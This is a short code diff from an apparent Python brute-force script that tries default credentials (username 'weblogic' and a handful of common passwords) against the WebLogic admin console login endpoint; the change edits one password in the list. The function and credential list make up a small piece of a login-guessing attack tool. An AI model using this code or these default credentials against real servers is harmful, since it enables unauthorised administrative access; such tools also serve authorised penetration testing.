@@ -10,7 +10,7 @@ import re
 
 def brute_force(ip_port):
     unames = ['weblogic']
-    pwds = ['weblogic', 'weblogic123', 'pwweblogic1','weblogic1']
+    pwds = ['weblogic', 'weblogic123', 'pwweblogic','weblogic1']
     url = 'http://' + ip_port[0] + ':' + ip_port[1] + '/console/j_security_check'
 
     #print url,
